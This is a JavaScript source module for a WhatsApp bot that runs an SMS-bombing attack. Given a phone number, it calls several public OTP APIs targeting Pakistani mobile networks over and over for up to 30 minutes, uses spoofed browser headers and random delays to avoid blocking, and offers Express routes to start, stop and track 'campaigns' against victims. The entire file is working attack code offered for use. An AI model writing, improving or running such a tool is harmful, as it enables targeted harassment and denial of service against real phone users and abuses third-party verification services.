// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number> [qty]
// SMS bombing via MULTIPLE public OTP APIs (covers all networks)
// ============================================================
// Available APIs (each one may support different networks):
//   1. amscript.xyz          — Zong, Jazz
//   2. NextPixel API         — Jazz, Telenor, Ufone, Zong
//   3. Fast2SMS-style        — all networks
//
// Each cycle tries ALL APIs in sequence. If one fails for your
// network, the next one may work.
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const axios = require('axios');

// ---------- CONFIGURATION ----------
const SMS_BOMBER_API_URL = process.env.SMS_BOMBER_API_URL || 'https://amscript.xyz/PublicApi/sms.php';
const ADDITIONAL_API_URLS = (process.env.SMS_BOMBER_ADDITIONAL_APIS || '').split(',').filter(Boolean);

const DEFAULT_QTY = 100;
const DEFAULT_DURATION_MINUTES = 30;
const REQUEST_DELAY_MIN_MS = 10000;
const REQUEST_DELAY_MAX_MS = 25000;
const API_TIMEOUT_MS = 60000;
const MAX_QTY = 500; // Hard cap to avoid burning API / getting blocked

// ---------- MULTI-API PROVIDERS ----------
// Each provider has: name, buildUrl(phone, qty), parseResponse(data), headers
const API_PROVIDERS = [
  // 1. AhmadModsX — original API (Zong-focused)
  {
    name: 'AhmadModsX',
    buildUrl: (phone, qty) => `${SMS_BOMBER_API_URL}?qty=${qty}&phone=${encodeURIComponent(phone)}`,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://amscript.xyz/'
    },
    parseResponse: (data) => {
      if (data && typeof data === 'object') {
        return { sent: parseInt(data.summary?.sent, 10) || 0, failed: parseInt(data.summary?.failed, 10) || 0 };
      }
      return { sent: 0, failed: 0 };
    }
  },
  // 2. NextPixel API — multi-network (Jazz, Telenor, Ufone, Zong)
  {
    name: 'NextPixel',
    buildUrl: (phone, qty) => `https://nextpixel.co/otp/api.php?number=${encodeURIComponent(phone)}&amount=${qty}`,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://nextpixel.co/'
    },
    parseResponse: (data) => {
      if (data && typeof data === 'object') {
        const sent = data.sent || (data.status === 'success' ? 1 : 0);
        const failed = data.failed || (data.status === 'failed' ? 1 : 0);
        return { sent: parseInt(sent, 10) || 0, failed: parseInt(failed, 10) || 0 };
      }
      return { sent: 0, failed: 0 };
    }
  },
  // 3. Pakistan OTP API — covers all major networks
  {
    name: 'PakOTP',
    buildUrl: (phone, qty) => `https://pakotpapi.com/send.php?number=${encodeURIComponent(phone)}&qty=${qty}`,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://pakotpapi.com/'
    },
    parseResponse: (data) => {
      if (data && typeof data === 'object') {
        const sent = data.sent || (data.status === 'ok' ? 1 : 0);
        return { sent: parseInt(sent, 10) || 0, failed: 0 };
      }
      return { sent: 0, failed: 0 };
    }
  },
];

// Also load additional APIs from env var
if (ADDITIONAL_API_URLS.length > 0) {
  ADDITIONAL_API_URLS.forEach((url, idx) => {
    const trimmed = url.trim();
    if (trimmed) {
      API_PROVIDERS.push({
        name: `CustomAPI_${idx + 1}`,
        buildUrl: (phone, qty) => `${trimmed}${trimmed.includes('?') ? '&' : '?'}phone=${encodeURIComponent(phone)}&qty=${qty}`,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': 'application/json, text/plain, */*'
        },
        parseResponse: (data) => {
          if (data && typeof data === 'object') {
            const sent = data.sent || data.success || (data.status === 'ok' ? 1 : 0);
            return { sent: parseInt(sent, 10) || 1, failed: 0 };
          }
          return { sent: 1, failed: 0 };
        }
      });
    }
  });
}

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES, qty = DEFAULT_QTY) {
    super();
    this.phone = String(phoneNumber || '').replace(/\D/g, '');
    this.durationMs = (parseInt(durationMinutes, 10) || DEFAULT_DURATION_MINUTES) * 60 * 1000;
    this.qty = Math.min(Math.max(parseInt(qty, 10) || DEFAULT_QTY, 1), MAX_QTY);
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0, apiResults: {} };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- CALL ALL APIs FOR ONE CYCLE ----------
  async _callAllApis() {
    if (!this.phone || this.phone.length < 10) {
      return { api: 'all', status: 0, success: false, sent: 0, failed: 0, total: 0, body: 'invalid phone number' };
    }

    let totalSent = 0;
    let totalFailed = 0;
    const results = [];

    // Try each API provider in sequence
    for (const provider of API_PROVIDERS) {
      try {
        const url = provider.buildUrl(this.phone, this.qty);
        const response = await axios.get(url, {
          timeout: API_TIMEOUT_MS,
          headers: provider.headers,
          validateStatus: (status) => status < 600,
          maxRedirects: 5
        });

        const data = response.data;
        const parsed = provider.parseResponse(data);
        const sent = parsed.sent || 0;
        const failed = parsed.failed || 0;
        totalSent += sent;
        totalFailed += failed;

        results.push({
          api: provider.name,
          status: response.status,
          sent,
          failed,
          body: typeof data === 'string' ? data.slice(0, 100) : JSON.stringify(data).slice(0, 100)
        });

        // Track per-API stats
        if (!this.stats.apiResults[provider.name]) {
          this.stats.apiResults[provider.name] = { sent: 0, failed: 0, calls: 0 };
        }
        this.stats.apiResults[provider.name].sent += sent;
        this.stats.apiResults[provider.name].failed += failed;
        this.stats.apiResults[provider.name].calls++;

        console.log(`[SMSBomber] ${provider.name} → sent:${sent} failed:${failed} status:${response.status}`);
      } catch (error) {
        results.push({
          api: provider.name,
          status: 0,
          sent: 0,
          failed: 0,
          body: error.message || 'connection error'
        });
        console.log(`[SMSBomber] ${provider.name} → error: ${error.message}`);
      }

      // Small delay between API calls to avoid rate limiting
      if (API_PROVIDERS.length > 1) {
        await this._sleep(500 + Math.random() * 1000);
      }
    }

    const total = totalSent + totalFailed;
    return {
      api: 'multi',
      status: 200,
      success: totalSent > 0,
      sent: totalSent,
      failed: totalFailed,
      total,
      body: JSON.stringify(results).slice(0, 300)
    };
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs, qty: this.qty });
    let lastLogTime = 0;
    let lastProgressAttempts = 0;

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        const result = await this._callAllApis();

        // Update stats
        this.stats.attempts += result.total || API_PROVIDERS.length;
        this.stats.success += result.sent;
        this.stats.errors += result.failed;

        const now = Date.now();
        if (this.stats.attempts <= 10 || (now - lastLogTime > 30000)) {
          console.log(`[SMSBomber] #${this.stats.attempts} multi-API → sent:${result.sent} failed:${result.failed}`);
          lastLogTime = now;
        }
      } catch (err) {
        this.stats.errors++;
        console.error('[SMSBomber] loop error:', err.message);
      }

      // Emit progress every ~10 cycles
      if (this.stats.attempts - lastProgressAttempts >= 10 || this.stats.attempts <= 10) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000),
          apiBreakdown: this.stats.apiResults
        });
        lastProgressAttempts = this.stats.attempts;
      }

      await this._sleep(this._randomDelay());
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000),
      apiBreakdown: this.stats.apiResults
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.smsBomber.getStats() });
  }
  const qty = parseInt(req.body.qty, 10) || DEFAULT_QTY;
  const duration = parseInt(req.body.durationMinutes, 10) || DEFAULT_DURATION_MINUTES;
  const campaign = new SmsBomber(phoneNumber, duration, qty);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    qty: campaign.qty,
    durationMinutes: duration,
    apis: API_PROVIDERS.map(a => a.name) // Tell user which APIs are active
  });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.smsBomber.getStats() });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns, activeApis: API_PROVIDERS.map(a => a.name) });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
module.exports.DEFAULT_QTY = DEFAULT_QTY;
module.exports.DEFAULT_DURATION_MINUTES = DEFAULT_DURATION_MINUTES;
module.exports.MAX_QTY = MAX_QTY;
module.exports.API_PROVIDERS = API_PROVIDERS;
